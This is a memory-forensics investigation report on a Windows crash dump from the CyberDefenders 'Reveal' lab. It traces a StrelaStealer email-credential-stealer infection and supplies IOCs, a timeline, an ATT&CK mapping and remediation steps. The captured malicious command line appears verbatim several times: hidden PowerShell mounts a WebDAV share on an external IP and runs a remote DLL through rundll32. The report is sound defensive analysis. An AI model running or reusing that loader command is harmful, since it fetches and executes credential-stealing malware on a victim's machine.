# Investigation Report — 192-Reveal.dmp (StrelaStealer / WebDAV Credential Theft)

> **Status:** COMPLETE — all sections analyst-filled from live run on 2026-06-11.

## 1. Case summary

| Field | Value |
|-------|-------|
| Image | `192-Reveal.dmp` |
| Image source | CyberDefenders "Reveal" blue-team lab — cyberdefenders.org |
| SHA256 | `7e724ff06c0967416958752aee8569c4bbc3ea733d572a9d870ebbfedcdf553d` |
| Size | 2048.0 MB (Windows crash dump) |
| Detected OS | Windows 10 x64 (NT 10.0 build 19041.1) |
| Volatility | Volatility 3 Framework 2.28.0 |
| Analysed (UTC) | 2026-06-11T22:08:10+00:00 |
| Integrity verified post-run | yes — SHA256 matched pre/post; image unchanged |

## 2. Objective

Work out whether this Windows 10 workstation was compromised. If it was, identify the malware, reconstruct how it ran, find the C2 and staging infrastructure, figure out what data the attacker was positioned to take, and produce IOCs that are ready for blocking and threat-intel enrichment.

## 3. Methodology

Standard pipeline run (`python3 -m src.cli analyze`). The image was SHA256-hashed before and after analysis, and the curated Windows Volatility 3 plugin set was run with JSON and text capture into evidence pack `192-Reveal_20260611T220810Z`. Every command is in `run_log.txt`. One caveat: `windows.malfind` was run per-PID in batches and the JSON merged afterwards. That was a sandbox accommodation only; the commands and output match a single invocation.

| Plugin | Status | Duration (s) |
|--------|--------|--------------|
| `windows.info` | ok | 0.30 |
| `windows.pslist` | ok | 0.44 |
| `windows.psscan` | ok | 10.84 |
| `windows.pstree` | ok | 0.66 |
| `windows.cmdline` | ok | 0.50 |
| `windows.netscan` | ok | 11.28 |
| `windows.netstat` | ok | 0.35 |
| `windows.dlllist` | ok | 2.29 |
| `windows.malfind` | ok | (batched) |
| `windows.svcscan` | ok | 6.85 |
| `windows.registry.hivelist` | ok | 0.41 |
| `windows.handles` | ok | 22.15 |

## 4. Findings

### 4.1 Processes — the malicious execution chain

There are 109 processes in pslist. Most of the host looks like an ordinary working day (Edge, Thunderbird, Skype, OneDrive). The whole intrusion sits in one short-lived branch, every process stamped 2024-07-15 07:00:03–07:00:06 UTC:

```
[4120]  (parent — not in pslist/psscan; exited before capture)
 ├── wordpad.exe   (9112)  ← decoy document opened for the user
 └── powershell.exe (3692) ← "-windowstyle hidden", the real payload
      └── net.exe   (2416) ← mounts attacker WebDAV share \\45.9.74.32@8888\davwwwroot\
```

The PowerShell command line (`windows.cmdline`, PID 3692) gives the game away:

```
powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
```

This is the StrelaStealer infection chain. The parent process (PID 4120, already gone by capture time, which is why it shows up in neither pslist nor psscan) opened a decoy in WordPad to keep the victim busy, while a hidden PowerShell instance mapped a remote WebDAV share on port 8888 with `net use` and then handed `3435.dll` to `rundll32.exe`, calling its `entry` export. Because the DLL runs straight off the WebDAV share, it never lands on local disk, which is the point: file-based AV has nothing to scan. The host `45.9.74.32:8888/davwwwroot/3435.dll` is documented elsewhere as live StrelaStealer infrastructure (ANY.RUN, Cyble; see §10).

`net.exe` (PID 2416) was still holding an ESTABLISHED TCP session to `45.9.74.32:8888` when the image was taken (`windows.netscan`). The WebDAV mount was live, not a leftover.

### 4.2 psscan vs pslist cross-view diff

The cross-view diff flagged 10 processes that are in `psscan` but not `pslist`. They all turn out to be benign processes that had recently exited: svchost, RuntimeBroker, OneDriveStandaloneUpdater, audiodg, msiexec, SearchProtocolHost, backgroundTaskHost. Each has a populated `ExitTime` clustered around 06:59 and earlier in the morning, which is normal process churn rather than DKOM hiding. The actual malicious parent (PID 4120) had already exited and left no pool artefact at all, which fits a short-lived loader. Nothing here points to kernel-level process hiding.

### 4.3 Network connections

One external connection matters, and it is the staging session:

| Process | PID | Proto | Foreign | State | Assessment |
|---------|-----|-------|---------|-------|------------|
| net.exe | 2416 | TCPv4 | 45.9.74[.]32:8888 | **ESTABLISHED** | **Malicious** — StrelaStealer WebDAV payload host |

Everything else in `netscan` lines up with the apps installed on the box: Microsoft, Edge, Skype and OneDrive endpoints (13.107.x, 20.x, 191.237.x, 52.x) plus Thunderbird's mail traffic. I'm treating those as benign. The IOC extractor surfaced them by IP heuristic, and analyst triage clears them. Worth noting that `45.9.74.32` is reached on the non-standard WebDAV port 8888, which is the network IOC that separates this from normal HTTPS noise.

### 4.4 Injected code (malfind)

`malfind` flagged executable private memory in a handful of processes. After triage:

| Process | PID | Protection | Regions | Interpretation |
|---------|-----|-----------|---------|----------------|
| `powershell.exe` | 3692 | PAGE_EXECUTE_READWRITE | 5 | **Malicious** — RWX in the loader hosting the reflectively-run DLL |
| `smartscreen.exe` | 2820 | PAGE_EXECUTE_READWRITE | 1 | RWX, single region — review; probably SmartScreen JIT but RWX is worth a note |
| `thunderbird.exe` | 3004 / 3644 / 4492 | PAGE_EXECUTE_READ | 1–2 | **R-X, not RWX** — benign Thunderbird/XUL JIT, not injection |
| `RuntimeBroker.exe` | 7848 | PAGE_EXECUTE_READ | 1 | R-X — benign broker JIT |

The one that counts is PID 3692 (powershell.exe), with five PAGE_EXECUTE_READWRITE regions that have no file backing. That is where the WebDAV-loaded StrelaStealer DLL lives in memory. The Thunderbird and RuntimeBroker regions are PAGE_EXECUTE_READ, i.e. managed or JIT code, not injection. Calling those malicious would be a false positive, and it's exactly the call the tool leaves to a human rather than auto-concluding.

### 4.5 The target: Thunderbird

StrelaStealer exists to steal email credentials, mainly from Mozilla Thunderbird and Microsoft Outlook. It reads the saved-password store and the IMAP/SMTP server config and ships them to its C2. This host was running Thunderbird with several child processes (PIDs 5364, 4492, 8600, 8332, 3644, 3004) active since 04:03 UTC. A live, configured mail client is precisely the data this malware goes after, so I'd treat the victim's email credentials as the main loss.

### 4.6 Persistence

`svcscan` showed no service running from a suspicious path. The one non-driver user-mode service worth checking, `WebClient`, is the legitimate Windows WebDAV redirector. It has to be running for the `net use` WebDAV mount to work, but it's a standard OS component, not something the attacker installed. That fits StrelaStealer's design: it runs once, grabs credentials in memory and exfiltrates, rather than digging in for the long term. I did not run a registry run-key check (`windows.registry.printkey` against the `Run` keys) in this pass, and that's the obvious step to confirm the no-persistence read (see §9).

## 5. Timeline

Rebuilt from process `CreateTime` fields (UTC). The host booted on 2024-07-04; the intrusion is the tight 07:00 cluster on 2024-07-15.

| Time (UTC) | Event | Evidence |
|------------|-------|----------|
| 2024-07-04 10:44:48 | System boot | `System` PID 4, `smss.exe` PID 300 |
| 2024-07-15 04:03:59 | User's Thunderbird mail client running (target app) | `thunderbird.exe` PID 5364 |
| 2024-07-15 06:58–06:59 | Normal morning process churn (Edge tabs, brokers) | pslist/psscan |
| **2024-07-15 07:00:03** | **Malicious parent (PID 4120) spawns WordPad decoy and hidden PowerShell** | `wordpad.exe` 9112, `powershell.exe` 3692 |
| **2024-07-15 07:00:06** | **`net use` mounts attacker WebDAV share; rundll32 runs 3435.dll from it** | `net.exe` 2416, cmdline IOC, ESTABLISHED conn to 45.9.74.32:8888 |
| 2024-07-15 07:00:08 | **Memory image captured** — intrusion caught live, ~2 s after WebDAV mount | SystemTime in `windows.info` |

The capture landed only seconds into the infection. The WebDAV session was still ESTABLISHED and the loader PowerShell was still resident, which is why the chain reads so cleanly.

## 6. IOCs (42 candidates extracted; high-confidence subset)

| Type | Value | Process | Why flagged |
|------|-------|---------|-------------|
| cmdline | `powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry` | powershell.exe (3692) | Hidden PowerShell → WebDAV → rundll32 of remote DLL |
| ip | `45.9.74[.]32` | net.exe (2416) | StrelaStealer WebDAV payload host, port 8888, ESTABLISHED |
| url | `\\45.9.74[.]32@8888\davwwwroot\3435.dll` | — | Remote DLL payload (executed via `entry` export) |
| file | `3435.dll` | — | StrelaStealer payload, run from WebDAV (never on local disk) |
| injected_code | `powershell.exe` (3692) | — | 5 RWX private regions, no file backing — in-memory DLL |
| process | `powershell.exe` → `net.exe` → (WordPad decoy) | 3692 / 2416 / 9112 | Anomalous WordPad and hidden-PowerShell sibling pair |

The full defanged list with machine-readable context is in `iocs.json` (ThreatLens-ready schema). Most of the 42 candidates are heuristic hits that analyst triage clears: benign Microsoft IPs, the `^[a-z0-9]{8,}\.exe$` name pattern matching legitimate binaries like `Calculator.exe` and `SkypeApp.exe`, and the R-X malfind regions. That's the tool surfacing breadth and the human supplying judgement, which is the design.

## 7. MITRE ATT&CK mapping

| Tactic | Technique | ID | Evidence |
|--------|-----------|----|----------|
| Initial Access | Phishing: Spearphishing Attachment | T1566.001 | Decoy opened in WordPad alongside the loader; StrelaStealer is mail-attachment delivered |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | `powershell.exe -windowstyle hidden …` (PID 3692) |
| Execution | System Binary Proxy Execution: Rundll32 | T1218.011 | `rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry` |
| Defense Evasion | Hide Artifacts: Hidden Window | T1564.003 | `-windowstyle hidden` |
| Defense Evasion | Reflective / no-disk payload (run from WebDAV) | T1620 | DLL executed directly off remote share; never written to local disk |
| Command and Control | Web Service / WebDAV over non-standard port | T1071 / T1571 | `net use \\45.9.74.32@8888\davwwwroot\`, port 8888 ESTABLISHED |
| Credential Access | Credentials from Password Stores (email clients) | T1555 | StrelaStealer targets Thunderbird/Outlook saved credentials; Thunderbird live on host |
| Collection | Email Collection | T1114 | StrelaStealer harvests mail-client credentials and server config |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | Stolen credentials shipped back over the same WebDAV/HTTP C2 |

## 8. Verdict & assessment

**Verdict: COMPROMISED — high confidence. Malware identified as StrelaStealer.**

The host was infected with StrelaStealer, an email-credential stealer, through the campaign's signature chain. A malicious attachment opened a WordPad decoy while a hidden PowerShell process used `net use` to mount the attacker's WebDAV share at `45.9.74.32:8888`, then `rundll32` ran `3435.dll` straight from that share so it never touched local disk. The memory image was captured about two seconds into execution with the WebDAV session still ESTABLISHED, which preserved the whole chain. Thunderbird was configured and running, so I'd treat the victim's email credentials as already stolen.

What makes me confident:

- The PowerShell command line is an exact match for the documented StrelaStealer WebDAV-loader technique.
- `45.9.74.32:8888/davwwwroot/3435.dll` is corroborated externally as live StrelaStealer infrastructure (ANY.RUN, Cyble).
- The process lineage (hidden PowerShell and a WordPad decoy as siblings) and the live ESTABLISHED C2 connection back each other up.
- Five RWX malfind regions in the loader PowerShell confirm an in-memory payload.
- The cross-view diff and the Thunderbird R-X malfind hits were triaged and cleared, so the malicious signal here is specific rather than a wide smear of false positives.

To push confidence higher: dump `3435.dll` from PID 3692's RWX regions (`windows.vadinfo` / `windows.dumpfiles`) and submit the hash to VirusTotal; carve the WordPad decoy document to recover the delivery email; run `windows.registry.printkey` on the Run keys to confirm the no-persistence call.

## 9. Recommendations

**Immediate containment:**

- Isolate the host now. The WebDAV C2 session to `45.9.74.32:8888` was live at capture.
- Block `45.9.74[.]32` and outbound WebDAV / `net use` to external hosts at the perimeter firewall, with particular attention to non-standard ports like 8888.
- Hunt the environment for the same PowerShell / `net use` / `rundll32 …,entry` pattern and for any connection to `45.9.74.0/24`.

**Credential reset (treat as stolen):**

- Reset the user's email credentials immediately. Thunderbird and Outlook saved passwords and mail-server logins are StrelaStealer's whole purpose.
- Reset anything else reachable from that mailbox, and audit sent items and mailbox rules for attacker abuse.
- If the host is domain-joined, rotate the user's domain password and review for lateral movement.

**Eradication:**

- Reimage the host. In-memory stealers leave little on disk, but the delivery email, the attachment and any dropped artefacts still need to go.
- Find and quarantine the originating phishing email across all mailboxes.

**Hardening:**

- Block or constrain `rundll32.exe` and `powershell.exe` execution against UNC/WebDAV paths via AppLocker or WDAC, and put PowerShell into Constrained Language Mode.
- Disable the WebClient (WebDAV) service where the business doesn't need it. It's what makes `net use \\ip@port\` mounts possible in the first place.
- Turn on PowerShell ScriptBlock and module logging so hidden-window invocations get recorded.
- Detonate inbound attachments in a sandbox to catch the delivery stage.

## 10. References

- ANY.RUN — malware analysis of `http://45.9.74.32:8888/davwwwroot/3435.dll` (StrelaStealer): https://any.run/report/e19b6144d7da72a97f5468fade0ed971a798359ed2f1dcb1e5e28f2d6b540175/28ba4903-16e2-44b1-bcdc-2eb686ad3dcf
- Cyble — "Strela Stealer Targets Europe Stealthily Via WebDAV": https://cyble.com/blog/strela-stealer-targets-europe-stealthily-via-webdav/
- CyberDefenders — "Reveal" lab: https://cyberdefenders.org/blueteam-ctf-challenges/reveal/
